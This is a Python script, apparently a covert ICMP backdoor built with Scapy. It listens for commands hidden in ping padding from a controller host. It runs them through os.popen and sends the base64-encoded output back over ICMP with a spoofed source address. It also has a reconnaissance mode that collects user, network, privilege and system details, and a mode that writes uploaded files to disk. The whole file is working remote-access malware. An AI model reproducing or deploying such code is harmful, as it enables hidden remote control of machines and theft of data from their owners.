#auhor:九世
#time:2019/2/20
#coding: utf-8

from scapy.all import *
import os
import math
import base64
import time

commands=['echo [+]当前用户名&&net user','echo [+]IP地址&&ipconfig /all','[+]当前权限&&whoami','[+]系统详细环境&&systeminfo','echo [+]系统用户组&&net localgroup']

dst = '10.153.32.53'
wei=548

def fs(data):
    zon = IP(ttl=10, dst=dst, src='127.0.0.1') / ICMP(type="echo-request") / Padding(load='{}'.format(data))
    send(zon, count=1)

def js():
    jieshou=sniff(iface='以太网',filter='icmp',count=1,timeout=99999)
    paddings=jieshou[0]['Padding']
    jg = str(paddings).lstrip("b'"[0]).replace("'", '')
    if jg !='':
        return  jg



while True:
    demo=js()
    if demo=='Demo':
        fs(data='Demo')
        while True:
            shell=js()
            if shell=='shell':
                fs('shell')
                while True:
                    jr=js()
                    qc=str(jr)
                    if '@@' in qc:
                        command=os.popen(qc.replace('@@',''))
                        data_lens=''
                        for line in command.readlines():
                            data=bytes.decode(base64.b64encode(bytes(line,encoding='utf-8')))
                            data_lens+=data
                            fs(data)

                        fs(len(data_lens))

                    if 'break' in qc:
                        break

            elif shell=='shouji':
                rl=''
                for s in commands:
                    zx=os.popen(s)
                    for u in zx.readlines():
                        jd=bytes.decode(base64.b64encode(bytes(u,encoding='utf-8')))
                        rl+=jd
                        fs(jd)

                fs(len(rl))

            elif shell=='exit':
                exit()

            elif shell=='upload':
                jt=js()
                print('file_name',jt)
                data=''
                while True:
                    dat=js()
                    data+=dat

                    if dat.isdigit()==True:
                        data=data.replace(dat,'')
                        if len(data)==int(dat):
                            xj=open(jt,'wb')
                            xj.write(base64.b64decode(data))
                            xj.close()
                            fs('yes')
                            break
                        else:
                            break

            elif shell=='sleep':
                break